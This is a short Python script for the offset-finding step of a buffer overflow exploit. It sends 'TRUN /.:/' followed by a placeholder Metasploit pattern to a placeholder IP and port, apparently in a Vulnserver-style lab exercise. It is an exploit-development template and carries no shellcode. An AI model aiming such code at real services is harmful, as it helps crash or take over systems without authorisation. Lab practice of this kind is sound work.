#!/usr/bin/python
# Modified script to find the offset

import sys, socket

offset = "put the generated msf code here"
payload = "TRUN /.:/" + offset


try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('IP_ADDRESS',PORT))
        s.send((payload.encode()))
        s.close()
except:
        print("Error conecting to the server")
        sys.exit()
